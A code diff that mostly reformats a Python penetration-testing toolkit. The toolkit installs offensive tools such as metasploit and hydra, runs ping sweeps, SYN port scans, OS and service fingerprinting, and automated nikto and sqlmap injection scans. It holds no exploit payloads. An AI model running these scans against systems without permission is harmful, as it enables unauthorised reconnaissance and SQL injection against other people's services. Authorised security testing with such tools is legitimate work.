@@ -31,10 +31,14 @@ def install_dependencies():
     user = os.environ.get("SUDO_USER", os.environ.get("USER"))
     try:
         if os.geteuid() != 0:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user"] + required_packages)
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", "--user"] + required_packages
+            )
         else:
             subprocess.check_call(
-                ["sudo", "-u", user, sys.executable, "-m", "pip", "install", "--user"] + required_packages)
+                ["sudo", "-u", user, sys.executable, "-m", "pip", "install", "--user"]
+                + required_packages
+            )
     except subprocess.CalledProcessError as e:
         print(f"Failed to install dependencies: {e}")
         sys.exit(1)
@@ -49,8 +53,14 @@ try:
     from rich.panel import Panel
     from rich.prompt import Prompt, Confirm, IntPrompt
     from rich.progress import (
-        Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn,
-        TimeElapsedColumn, TimeRemainingColumn, MofNCompleteColumn
+        Progress,
+        SpinnerColumn,
+        TextColumn,
+        BarColumn,
+        TaskProgressColumn,
+        TimeElapsedColumn,
+        TimeRemainingColumn,
+        MofNCompleteColumn,
     )
     from rich.live import Live
     from rich.align import Align
@@ -94,7 +104,7 @@ DEFAULT_TIMEOUT = 30
 USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0",
 ]
 
 for d in [BASE_DIR, RESULTS_DIR, PAYLOADS_DIR, CONFIG_DIR, WORDLISTS_DIR, HISTORY_DIR]:
@@ -173,14 +183,24 @@ class NordColors:
 
     @classmethod
     def get_polar_gradient(cls, steps=4):
-        return [cls.POLAR_NIGHT_1, cls.POLAR_NIGHT_2, cls.POLAR_NIGHT_3, cls.POLAR_NIGHT_4][:steps]
+        return [
+            cls.POLAR_NIGHT_1,
+            cls.POLAR_NIGHT_2,
+            cls.POLAR_NIGHT_3,
+            cls.POLAR_NIGHT_4,
+        ][:steps]
 
     @classmethod
     def get_progress_columns(cls):
         return [
             SpinnerColumn(spinner_name="dots", style=f"bold {cls.FROST_1}"),
             TextColumn(f"[bold {cls.FROST_2}]{{task.description}}[/]"),
-            BarColumn(bar_width=None, style=cls.POLAR_NIGHT_3, complete_style=cls.FROST_2, finished_style=cls.GREEN),
+            BarColumn(
+                bar_width=None,
+                style=cls.POLAR_NIGHT_3,
+                complete_style=cls.FROST_2,
+                finished_style=cls.GREEN,
+            ),
             TaskProgressColumn(style=cls.SNOW_STORM_1),
             MofNCompleteColumn(),
             TimeRemainingColumn(compact=True),
@@ -196,7 +216,7 @@ SECURITY_TOOLS = [
             (InstallMethod.BREW, "nmap"),
         ],
         homepage="https://nmap.org",
-        is_core=True
+        is_core=True,
     ),
     Tool(
         name="wireshark",
@@ -209,7 +229,7 @@ SECURITY_TOOLS = [
         post_install=[
             "echo 'Wireshark installed. You may need to run it from Applications folder.'",
         ],
-        homepage="https://www.wireshark.org"
+        homepage="https://www.wireshark.org",
     ),
     Tool(
         name="masscan",
@@ -218,7 +238,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "masscan"),
         ],
-        homepage="https://github.com/robertdavidgraham/masscan"
+        homepage="https://github.com/robertdavidgraham/masscan",
     ),
     Tool(
         name="tcpdump",
@@ -227,7 +247,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "tcpdump"),
         ],
-        homepage="https://www.tcpdump.org/"
+        homepage="https://www.tcpdump.org/",
     ),
     Tool(
         name="mitmproxy",
@@ -237,7 +257,7 @@ SECURITY_TOOLS = [
             (InstallMethod.BREW, "mitmproxy"),
             (InstallMethod.PIP, "mitmproxy"),
         ],
-        homepage="https://mitmproxy.org/"
+        homepage="https://mitmproxy.org/",
     ),
     Tool(
         name="burpsuite",
@@ -246,7 +266,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW_CASK, "burp-suite"),
         ],
-        homepage="https://portswigger.net/burp"
+        homepage="https://portswigger.net/burp",
     ),
     Tool(
         name="sqlmap",
@@ -256,7 +276,7 @@ SECURITY_TOOLS = [
             (InstallMethod.BREW, "sqlmap"),
             (InstallMethod.PIP, "sqlmap"),
         ],
-        homepage="https://sqlmap.org/"
+        homepage="https://sqlmap.org/",
     ),
     Tool(
         name="nikto",
@@ -265,7 +285,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "nikto"),
         ],
-        homepage="https://cirt.net/Nikto2"
+        homepage="https://cirt.net/Nikto2",
     ),
     Tool(
         name="ffuf",
@@ -274,7 +294,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "ffuf"),
         ],
-        homepage="https://github.com/ffuf/ffuf"
+        homepage="https://github.com/ffuf/ffuf",
     ),
     Tool(
         name="gobuster",
@@ -283,7 +303,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "gobuster"),
         ],
-        homepage="https://github.com/OJ/gobuster"
+        homepage="https://github.com/OJ/gobuster",
     ),
     Tool(
         name="binwalk",
@@ -293,7 +313,7 @@ SECURITY_TOOLS = [
             (InstallMethod.BREW, "binwalk"),
             (InstallMethod.PIP, "binwalk"),
         ],
-        homepage="https://github.com/ReFirmLabs/binwalk"
+        homepage="https://github.com/ReFirmLabs/binwalk",
     ),
     Tool(
         name="hashcat",
@@ -302,7 +322,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "hashcat"),
         ],
-        homepage="https://hashcat.net/"
+        homepage="https://hashcat.net/",
     ),
     Tool(
         name="john",
@@ -311,7 +331,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "john-jumbo"),
         ],
-        homepage="https://www.openwall.com/john/"
+        homepage="https://www.openwall.com/john/",
     ),
     Tool(
         name="amass",
@@ -320,7 +340,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "amass"),
         ],
-        homepage="https://github.com/OWASP/Amass"
+        homepage="https://github.com/OWASP/Amass",
     ),
     Tool(
         name="subfinder",
@@ -329,7 +349,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "subfinder"),
         ],
-        homepage="https://github.com/projectdiscovery/subfinder"
+        homepage="https://github.com/projectdiscovery/subfinder",
     ),
     Tool(
         name="theharvester",
@@ -339,7 +359,7 @@ SECURITY_TOOLS = [
             (InstallMethod.BREW, "theharvester"),
             (InstallMethod.PIP, "theharvester"),
         ],
-        homepage="https://github.com/laramies/theHarvester"
+        homepage="https://github.com/laramies/theHarvester",
     ),
     Tool(
         name="metasploit",
@@ -348,7 +368,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "metasploit"),
         ],
-        homepage="https://www.metasploit.com/"
+        homepage="https://www.metasploit.com/",
     ),
     Tool(
         name="hydra",
@@ -357,7 +377,7 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "hydra"),
         ],
-        homepage="https://github.com/vanhauser-thc/thc-hydra"
+        homepage="https://github.com/vanhauser-thc/thc-hydra",
     ),
     Tool(
         name="radare2",
@@ -366,8 +386,8 @@ SECURITY_TOOLS = [
         install_methods=[
             (InstallMethod.BREW, "radare2"),
         ],
-        homepage="https://rada.re/r/"
-    )
+        homepage="https://rada.re/r/",
+    ),
 ]
 
 
@@ -470,7 +490,7 @@ def display_panel(title: str, message: str, style=NordColors.INFO):
             title=title,
             border_style=style,
             box=NordColors.NORD_BOX,
-            padding=(1, 2)
+            padding=(1, 2),
         )
     else:
         panel = Panel(
@@ -478,12 +498,14 @@ def display_panel(title: str, message: str, style=NordColors.INFO):
             title=title,
             border_style=style,
             box=NordColors.NORD_BOX,
-            padding=(1, 2)
+            padding=(1, 2),
         )
     console.print(panel)
 
 
-def get_user_input(prompt_text: str, history=None, password: bool = False, completer=None) -> str:
+def get_user_input(
+    prompt_text: str, history=None, password: bool = False, completer=None
+) -> str:
     try:
         return pt_prompt(
             f"[bold {NordColors.FROST_2}]{prompt_text}:[/] ",
@@ -506,7 +528,9 @@ def get_confirmation(prompt_text: str) -> bool:
         return False
 
 
-def get_integer_input(prompt_text: str, min_value: int = None, max_value: int = None) -> int:
+def get_integer_input(
+    prompt_text: str, min_value: int = None, max_value: int = None
+) -> int:
     try:
         while True:
             value_str = Prompt.ask(f"[bold {NordColors.FROST_2}]{prompt_text}[/]")
@@ -547,7 +571,9 @@ def create_menu_table(title, options):
     return table
 
 
-def display_progress(total: int, description: str, color: str = NordColors.FROST_2) -> Tuple[Progress, int]:
+def display_progress(
+    total: int, description: str, color: str = NordColors.FROST_2
+) -> Tuple[Progress, int]:
     progress = Progress(
         SpinnerColumn(spinner_name="dots", style=f"bold {color}"),
         TextColumn(f"[bold {color}]{{task.description}}"),
@@ -570,7 +596,7 @@ def save_result_to_file(result: Any, filename: str) -> bool:
                 "timestamp": result.timestamp.isoformat(),
                 "port_data": result.port_data,
                 "os_info": result.os_info,
-                "vulnerabilities": result.vulnerabilities
+                "vulnerabilities": result.vulnerabilities,
             }
         elif isinstance(result, OSINTResult):
             result_dict = {
@@ -588,7 +614,7 @@ def save_result_to_file(result: Any, filename: str) -> bool:
                 "timestamp": result.timestamp.isoformat(),
             }
         else:
-            result_dict = result.__dict__ if hasattr(result, '__dict__') else result
+            result_dict = result.__dict__ if hasattr(result, "__dict__") else result
 
         with open(filepath, "w") as f:
             json.dump(result_dict, f, indent=2)
@@ -600,11 +626,7 @@ def save_result_to_file(result: Any, filename: str) -> bool:
 
 
 def run_command(
-        cmd: List[str],
-        env=None,
-        check=True,
-        capture_output=True,
-        timeout=DEFAULT_TIMEOUT
+    cmd: List[str], env=None, check=True, capture_output=True, timeout=DEFAULT_TIMEOUT
 ) -> subprocess.CompletedProcess:
     cmd_str = " ".join(cmd)
     print_info(f"Executing: {cmd_str}")
@@ -649,7 +671,7 @@ def network_scanning_module():
     display_panel(
         "Network Scanning",
         "Discover active hosts, open ports and services.",
-        NordColors.FROST_1
+        NordColors.FROST_1,
     )
 
     options = [
@@ -658,7 +680,7 @@ def network_scanning_module():
         ("3", "Run Nmap", "Full-featured network scanner"),
         ("4", "Service Fingerprinting", "Identify services running on ports"),
         ("5", "OS Detection", "Attempt to identify operating systems"),
-        ("0", "Return", "Return to Main Menu")
+        ("0", "Return", "Return to Main Menu"),
     ]
 
     console.print(create_menu_table("Network Scanning Options", options))
@@ -691,12 +713,17 @@ def ping_sweep():
         hosts = list(network.hosts())
 
         if len(hosts) > 1000:
-            print_warning(f"Network has {len(hosts)} hosts. Limiting scan to first 1000.")
+            print_warning(
+                f"Network has {len(hosts)} hosts. Limiting scan to first 1000."
+            )
             hosts = hosts[:1000]
 
-        progress, task = display_progress(len(hosts), "Pinging hosts", NordColors.FROST_1)
+        progress, task = display_progress(
+            len(hosts), "Pinging hosts", NordColors.FROST_1
+        )
 
         with progress:
+
             def check_host(ip):
                 try:
                     cmd = ["ping", "-c", "1", "-W", "1", str(ip)]
@@ -705,7 +732,7 @@ def ping_sweep():
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         timeout=1,
-                        check=False
+                        check=False,
                     )
                     if result.returncode == 0:
                         live_hosts.append(str(ip))
@@ -721,7 +748,7 @@ def ping_sweep():
             display_panel(
                 "Scan Complete",
                 f"Found {len(live_hosts)} active hosts",
-                NordColors.GREEN
+                NordColors.GREEN,
             )
 
             host_table = Table(
@@ -732,7 +759,7 @@ def ping_sweep():
             host_table.add_column("IP Address", style=f"bold {NordColors.FROST_2}")
             host_table.add_column("Status", style=NordColors.GREEN)
 
-            for ip in sorted(live_hosts, key=lambda x: [int(p) for p in x.split('.')]):
+            for ip in sorted(live_hosts, key=lambda x: [int(p) for p in x.split(".")]):
                 host_table.add_row(ip, "● ACTIVE")
 
             console.print(host_table)
@@ -741,8 +768,12 @@ def ping_sweep():
                 timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                 filename = f"pingsweep_{target.replace('/', '_')}_{timestamp}.json"
                 save_result_to_file(
-                    {"subnet": target, "live_hosts": live_hosts, "timestamp": datetime.datetime.now().isoformat()},
-                    filename
+                    {
+                        "subnet": target,
+                        "live_hosts": live_hosts,
+                        "timestamp": datetime.datetime.now().isoformat(),
+                    },
+                    filename,
                 )
         else:
             display_panel("Scan Complete", "No active hosts found.", NordColors.RED)
@@ -756,12 +787,16 @@ def port_scan():
         return
 
     scan_type = get_integer_input(
-        "Select scan type: 1) TCP Connect, 2) TCP SYN (requires root), 3) Fast TCP SYN with Scapy", 1, 3
+        "Select scan type: 1) TCP Connect, 2) TCP SYN (requires root), 3) Fast TCP SYN with Scapy",
+        1,
+        3,
     )
     if scan_type < 1:
         return
 
-    port_range = get_user_input("Enter port range (e.g., 1-1000) or leave blank for common ports")
+    port_range = get_user_input(
+        "Enter port range (e.g., 1-1000) or leave blank for common ports"
+    )
     open_ports = {}
 
     if port_range:
@@ -770,9 +805,45 @@ def port_scan():
             ports = range(start, end + 1)
         except ValueError:
             print_error("Invalid port range. Using common ports.")
-            ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443, 9000, 9090]
+            ports = [
+                21,
+                22,
+                23,
+                25,
+                53,
+                80,
+                110,
+                443,
+                445,
+                1433,
+                3306,
+                3389,
+                5900,
+                8080,
+                8443,
+                9000,
+                9090,
+            ]
     else:
-        ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443, 9000, 9090]
+        ports = [
+            21,
+            22,
+            23,
+            25,
+            53,
+            80,
+            110,
+            443,
+            445,
+            1433,
+            3306,
+            3389,
+            5900,
+            8080,
+            8443,
+            9000,
+            9090,
+        ]
 
     progress, task = display_progress(len(ports), "Scanning ports", NordColors.FROST_1)
 
@@ -805,7 +876,7 @@ def port_scan():
                 result = run_command(cmd, capture_output=True, check=False)
 
                 for line in result.stdout.splitlines():
-                    match = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
+                    match = re.search(r"^(\d+)/tcp\s+open\s+(\S+)", line)
                     if match:
                         port = int(match.group(1))
                         service = match.group(2)
@@ -831,9 +902,13 @@ def port_scan():
                         ans = scapy.sr1(
                             scapy.IP(dst=target) / scapy.TCP(dport=port, flags="S"),
                             timeout=0.5,
-                            verbose=0
+                            verbose=0,
                         )
-                        if ans and ans.haslayer(scapy.TCP) and ans.getlayer(scapy.TCP).flags == 0x12:  # SYN-ACK
+                        if (
+                            ans
+                            and ans.haslayer(scapy.TCP)
+                            and ans.getlayer(scapy.TCP).flags == 0x12
+                        ):  # SYN-ACK
                             try:
                                 service = socket.getservbyport(port)
                             except:
@@ -850,7 +925,7 @@ def port_scan():
         display_panel(
             "Scan Complete",
             f"Found {len(open_ports)} open ports on {target}",
-            NordColors.GREEN
+            NordColors.GREEN,
         )
 
         port_table = Table(
@@ -878,7 +953,9 @@ def port_scan():
         if get_confirmation("Would you like to fingerprint services on these ports?"):
             service_fingerprinting(target, list(open_ports.keys()))
     else:
-        display_panel("Scan Complete", f"No open ports found on {target}", NordColors.YELLOW)
+        display_panel(
+            "Scan Complete", f"No open ports found on {target}", NordColors.YELLOW
+        )
 
 
 def run_nmap():
@@ -886,7 +963,7 @@ def run_nmap():
         display_panel(
             "Tool Missing",
             "Nmap is not installed. Please install it using:\nbrew install nmap",
-            NordColors.RED
+            NordColors.RED,
         )
         return
 
@@ -895,7 +972,9 @@ def run_nmap():
         return
 
     scan_type = get_integer_input(
-        "Select scan type: 1) Fast scan, 2) Comprehensive scan, 3) OS detection, 4) Vulnerability scan, 5) Custom", 1, 5
+        "Select scan type: 1) Fast scan, 2) Comprehensive scan, 3) OS detection, 4) Vulnerability scan, 5) Custom",
+        1,
+        5,
     )
 
     if scan_type == 1:
@@ -935,7 +1014,9 @@ def run_nmap():
             console.print(Syntax(result.stdout, "bash", theme="nord"))
             print_success(f"Results saved to: {output_path}")
         else:
-            display_panel("Scan Complete", "No output from nmap scan", NordColors.YELLOW)
+            display_panel(
+                "Scan Complete", "No output from nmap scan", NordColors.YELLOW
+            )
     except Exception as e:
         print_error(f"Nmap scan error: {e}")
 
@@ -947,7 +1028,9 @@ def service_fingerprinting(target=None, ports=None):
             return
 
     if not ports:
-        port_input = get_user_input("Enter ports to scan (comma separated, e.g. 80,443,8080)")
+        port_input = get_user_input(
+            "Enter ports to scan (comma separated, e.g. 80,443,8080)"
+        )
         if not port_input:
             print_error("No ports specified")
             return
@@ -966,7 +1049,9 @@ def service_fingerprinting(target=None, ports=None):
 
 def fingerprint_basic(target, ports):
     results = {}
-    progress, task = display_progress(len(ports), "Fingerprinting services", NordColors.FROST_2)
+    progress, task = display_progress(
+        len(ports), "Fingerprinting services", NordColors.FROST_2
+    )
 
     with progress:
         for port in ports:
@@ -978,7 +1063,7 @@ def fingerprint_basic(target, ports):
                     s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                     banner = s.recv(1024)
                     if banner:
-                        banner = banner.decode('utf-8', errors='ignore').strip()
+                        banner = banner.decode("utf-8", errors="ignore").strip()
                         results[port] = {"banner": banner}
                     else:
                         # Try to guess service by port
@@ -997,7 +1082,7 @@ def fingerprint_basic(target, ports):
         display_panel(
             "Service Fingerprinting Results",
             f"Identified {len(results)} services on {target}",
-            NordColors.GREEN
+            NordColors.GREEN,
         )
 
         table = Table(
@@ -1013,12 +1098,17 @@ def fingerprint_basic(target, ports):
             table.add_row(
                 str(port),
                 info.get("service", "unknown"),
-                info.get("banner", "No banner")[:50] + ("..." if len(info.get("banner", "")) > 50 else "")
+                info.get("banner", "No banner")[:50]
+                + ("..." if len(info.get("banner", "")) > 50 else ""),
             )
 
         console.print(table)
     else:
-        display_panel("Fingerprinting Complete", "Could not identify any services", NordColors.YELLOW)
+        display_panel(
+            "Fingerprinting Complete",
+            "Could not identify any services",
+            NordColors.YELLOW,
+        )
 
 
 def fingerprint_nmap(target, ports):
@@ -1026,14 +1116,16 @@ def fingerprint_nmap(target, ports):
     cmd = ["nmap", "-sV", "-p", port_str, target]
 
     try:
-        with console.status(f"[bold {NordColors.FROST_2}]Fingerprinting services with Nmap...[/]"):
+        with console.status(
+            f"[bold {NordColors.FROST_2}]Fingerprinting services with Nmap...[/]"
+        ):
             result = run_command(cmd, capture_output=True, timeout=300)
 
         if result.stdout:
             # Parse nmap output
             services = {}
             for line in result.stdout.splitlines():
-                match = re.search(r'^(\d+)/tcp\s+open\s+(\S+)\s+(.*)', line)
+                match = re.search(r"^(\d+)/tcp\s+open\s+(\S+)\s+(.*)", line)
                 if match:
                     port = int(match.group(1))
                     service = match.group(2)
@@ -1044,7 +1136,7 @@ def fingerprint_nmap(target, ports):
                 display_panel(
                     "Service Fingerprinting Results",
                     f"Identified {len(services)} services on {target}",
-                    NordColors.GREEN
+                    NordColors.GREEN,
                 )
 
                 table = Table(
@@ -1060,7 +1152,7 @@ def fingerprint_nmap(target, ports):
                     table.add_row(
                         str(port),
                         info.get("service", "unknown"),
-                        info.get("details", "Unknown")
+                        info.get("details", "Unknown"),
                     )
 
                 console.print(table)
@@ -1068,15 +1160,21 @@ def fingerprint_nmap(target, ports):
                 if get_confirmation("Save these results to file?"):
                     scan_result = ScanResult(
                         target=target,
-                        port_data={port: info for port, info in services.items()}
+                        port_data={port: info for port, info in services.items()},
                     )
                     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                     filename = f"services_{target.replace('.', '_')}_{timestamp}.json"
                     save_result_to_file(scan_result, filename)
             else:
-                display_panel("Fingerprinting Complete", "Could not identify any services", NordColors.YELLOW)
+                display_panel(
+                    "Fingerprinting Complete",
+                    "Could not identify any services",
+                    NordColors.YELLOW,
+                )
         else:
-            display_panel("Fingerprinting Complete", "No output from nmap scan", NordColors.YELLOW)
+            display_panel(
+                "Fingerprinting Complete", "No output from nmap scan", NordColors.YELLOW
+            )
     except Exception as e:
         print_error(f"Service fingerprinting error: {e}")
 
@@ -1091,14 +1189,18 @@ def os_detection():
         if not get_confirmation("Continue without root?"):
             return
 
-    method = get_integer_input("Select detection method: 1) Nmap OS Detection, 2) TCP/IP Stack Fingerprinting", 1, 2)
+    method = get_integer_input(
+        "Select detection method: 1) Nmap OS Detection, 2) TCP/IP Stack Fingerprinting",
+        1,
+        2,
+    )
 
     if method == 1:
         if shutil.which("nmap") is None:
             display_panel(
                 "Tool Missing",
                 "Nmap is not installed. Please install it using:\nbrew install nmap",
-                NordColors.RED
+                NordColors.RED,
             )
             return
 
@@ -1107,7 +1209,9 @@ def os_detection():
             print_warning("Running without root privileges - results may be limited")
 
         try:
-            with console.status(f"[bold {NordColors.FROST_2}]Detecting OS with Nmap...[/]"):
+            with console.status(
+                f"[bold {NordColors.FROST_2}]Detecting OS with Nmap...[/]"
+            ):
                 result = run_command(cmd, capture_output=True, timeout=300)
 
             os_info = "Unknown"
@@ -1126,20 +1230,19 @@ def os_detection():
                         if os_guesses:
                             os_info = os_guesses
                     elif "OS detection performed" in line and "accuracy" in line:
-                        accuracy_match = re.search(r'accuracy: (\d+)', line)
+                        accuracy_match = re.search(r"accuracy: (\d+)", line)
                         if accuracy_match:
                             accuracy = int(accuracy_match.group(1))
 
             display_panel(
                 "OS Detection Results",
                 f"Target: {target}\nOS: {os_info}\nAccuracy: {accuracy}%",
-                NordColors.GREEN if accuracy > 80 else NordColors.YELLOW
+                NordColors.GREEN if accuracy > 80 else NordColors.YELLOW,
             )
 
             if get_confirmation("Save these results to file?"):
                 scan_result = ScanResult(
-                    target=target,
-                    os_info={"os": os_info, "accuracy": accuracy}
+                    target=target, os_info={"os": os_info, "accuracy": accuracy}
                 )
                 timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                 filename = f"os_detection_{target.replace('.', '_')}_{timestamp}.json"
@@ -1153,15 +1256,25 @@ def os_detection():
             print_error("Scapy is not installed, cannot perform TCP/IP fingerprinting")
             return
 
-        with console.status(f"[bold {NordColors.FROST_2}]Analyzing TCP/IP behavior...[/]"):
+        with console.status(
+            f"[bold {NordColors.FROST_2}]Analyzing TCP/IP behavior...[/]"
+        ):
             try:
                 # TTL probe
-                ttl_probe = scapy.sr1(scapy.IP(dst=target) / scapy.ICMP(), timeout=1, verbose=0)
+                ttl_probe = scapy.sr1(
+                    scapy.IP(dst=target) / scapy.ICMP(), timeout=1, verbose=0
+                )
                 ttl = ttl_probe.ttl if ttl_probe else 0
 
                 # Window size probe
-                syn_probe = scapy.sr1(scapy.IP(dst=target) / scapy.TCP(dport=80, flags="S"), timeout=1, verbose=0)
-                win_size = syn_probe.window if syn_probe and scapy.TCP in syn_probe else 0
+                syn_probe = scapy.sr1(
+                    scapy.IP(dst=target) / scapy.TCP(dport=80, flags="S"),
+                    timeout=1,
+                    verbose=0,
+                )
+                win_size = (
+                    syn_probe.window if syn_probe and scapy.TCP in syn_probe else 0
+                )
 
                 # Analyze results
                 os_guess = "Unknown"
@@ -1203,13 +1316,18 @@ def os_detection():
         display_panel(
             "TCP/IP Fingerprinting Results",
             f"Target: {target}\nOS: {os_guess}\nConfidence: {confidence}\nTTL: {ttl}\nWindow Size: {win_size}",
-            NordColors.GREEN if confidence == "High" else NordColors.YELLOW
+            NordColors.GREEN if confidence == "High" else NordColors.YELLOW,
         )
 
         if get_confirmation("Save these results to file?"):
             scan_result = ScanResult(
                 target=target,
-                os_info={"os": os_guess, "confidence": confidence, "ttl": ttl, "window_size": win_size}
+                os_info={
+                    "os": os_guess,
+                    "confidence": confidence,
+                    "ttl": ttl,
+                    "window_size": win_size,
+                },
             )
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"os_fingerprint_{target.replace('.', '_')}_{timestamp}.json"
@@ -1222,7 +1340,7 @@ def web_vulnerability_module():
     display_panel(
         "Web Vulnerability Scanning",
         "Scan for vulnerabilities in web applications.",
-        NordColors.FROST_2
+        NordColors.FROST_2,
     )
 
     options = [
@@ -1231,7 +1349,7 @@ def web_vulnerability_module():
         ("3", "Directory Bruteforce", "Discover hidden directories and files"),
         ("4", "Basic XSS Check", "Simple cross-site scripting checks"),
         ("5", "SSL/TLS Analysis", "Check for SSL/TLS vulnerabilities"),
-        ("0", "Return", "Return to Main Menu")
+        ("0", "Return", "Return to Main Menu"),
     ]
 
     console.print(create_menu_table("Web Vulnerability Options", options))
@@ -1258,7 +1376,7 @@ def run_nikto_scan():
         display_panel(
             "Tool Missing",
             "Nikto is not installed. Please install it using:\nbrew install nikto",
-            NordColors.RED
+            NordColors.RED,
         )
         return
 
@@ -1266,19 +1384,27 @@ def run_nikto_scan():
     if not target:
         return
 
-    options = get_user_input("Enter additional nikto options or leave blank for default")
+    options = get_user_input(
+        "Enter additional nikto options or leave blank for default"
+    )
 
     cmd = ["nikto", "-h", target]
     if options:
         cmd.extend(options.split())
 
     try:
-        with console.status(f"[bold {NordColors.FROST_2}]Running Nikto scan on {target}...[/]"):
-            result = run_command(cmd, capture_output=True, timeout=900)  # 15 minute timeout
+        with console.status(
+            f"[bold {NordColors.FROST_2}]Running Nikto scan on {target}...[/]"
+        ):
+            result = run_command(
+                cmd, capture_output=True, timeout=900
+            )  # 15 minute timeout
 
         if result.stdout:
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"nikto_{target.replace('://', '_').replace('/', '_')}_{timestamp}.txt"
+            filename = (
+                f"nikto_{target.replace('://', '_').replace('/', '_')}_{timestamp}.txt"
+            )
             output_path = RESULTS_DIR / filename
 
             with open(output_path, "w") as f:
@@ -1294,7 +1420,7 @@ def run_nikto_scan():
             display_panel(
                 "Nikto Scan Results",
                 f"Found {len(vulnerabilities)} potential vulnerabilities on {target}",
-                NordColors.FROST_2
+                NordColors.FROST_2,
             )
 
             if vulnerabilities:
@@ -1319,14 +1445,15 @@ def run_nikto_scan():
             print_success(f"Full results saved to: {output_path}")
 
             # Save structured data
-            scan_result = ScanResult(
-                target=target,
-                vulnerabilities=vulnerabilities
+            scan_result = ScanResult(target=target, vulnerabilities=vulnerabilities)
+            json_filename = (
+                f"nikto_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
             )
-            json_filename = f"nikto_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
             save_result_to_file(scan_result, json_filename)
         else:
-            display_panel("Scan Complete", "No output from Nikto scan", NordColors.YELLOW)
+            display_panel(
+                "Scan Complete", "No output from Nikto scan", NordColors.YELLOW
+            )
     except Exception as e:
         print_error(f"Nikto scan error: {e}")
 
@@ -1336,7 +1463,7 @@ def run_sqlmap_scan():
         display_panel(
             "Tool Missing",
             "SQLMap is not installed. Please install it using:\nbrew install sqlmap",
-            NordColors.RED
+            NordColors.RED,
         )
         return
 
@@ -1344,12 +1471,18 @@ def run_sqlmap_scan():
     if not target:
         return
 
-    scan_level = get_integer_input("Enter scan level (1-5, higher is more thorough)", 1, 5)
+    scan_level = get_integer_input(
+        "Enter scan level (1-5, higher is more thorough)", 1, 5
+    )
     if scan_level < 1:
         scan_level = 1
 
-    data = get_user_input("Enter POST data if applicable (leave blank for GET requests)")
-    cookie = get_user_input("Enter cookies if needed (format: name1=value1; name2=value2)")
+    data = get_user_input(
+        "Enter POST data if applicable (leave blank for GET requests)"
+    )
+    cookie = get_user_input(
+        "Enter cookies if needed (format: name1=value1; name2=value2)"
+    )
 
     cmd = ["sqlmap", "-u", target, "--batch", f"--level={scan_level}"]
 
@@ -1359,12 +1492,18 @@ def run_sqlmap_scan():
         cmd.extend(["--cookie", cookie])
 
     try:
-        with console.status(f"[bold {NordColors.FROST_2}]Running SQLMap scan on {target}...[/]"):
-            result = run_command(cmd, capture_output=True, timeout=1800)  # 30 minute timeout
+        with console.status(
+            f"[bold {NordColors.FROST_2}]Running SQLMap scan on {target}...[/]"
+        ):
+            result = run_command(
+                cmd, capture_output=True, timeout=1800
+            )  # 30 minute timeout
 
         if result.stdout:
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"sqlmap_{target.replace('://', '_').replace('/', '_')}_{timestamp}.txt"
+            filename = (
+                f"sqlmap_{target.replace('://', '_').replace('/', '_')}_{timestamp}.txt"
+            )
             output_path = RESULTS_DIR / filename
 
             with open(output_path, "w") as f:
@@ -1375,16 +1514,24 @@ def run_sqlmap_scan():
             for line in result.stdout.splitlines():
                 if "is vulnerable" in line.lower():
                     is_vulnerable = True
-                    vulnerabilities.append({"type": "SQL Injection", "description": line.strip()})
-                elif "parameter " in line.lower() and " is " in line.lower() and "vulnerable" in line.lower():
+                    vulnerabilities.append(
+                        {"type": "SQL Injection", "description": line.strip()}
+                    )
+                elif (
+                    "parameter " in line.lower()
+                    and " is " in line.lower()
+                    and "vulnerable" in line.lower()
+                ):
                     is_vulnerable = True
-                    vulnerabilities.append({"type": "SQL Injection", "description": line.strip()})
+                    vulnerabilities.append(
+                        {"type": "SQL Injection", "description": line.strip()}
+                    )
 
             if is_vulnerable:
                 display_panel(
                     "SQLMap Scan Results",
                     f"Target is VULNERABLE to SQL Injection: {target}",
-                    NordColors.RED
+                    NordColors.RED,
                 )
 
                 table = Table(
@@ -1403,20 +1550,19 @@ def run_sqlmap_scan():
                 display_panel(
                     "SQLMap Scan Results",
                     f"No SQL Injection vulnerabilities found on {target}",
-                    NordColors.GREEN
+                    NordColors.GREEN,
                 )
 
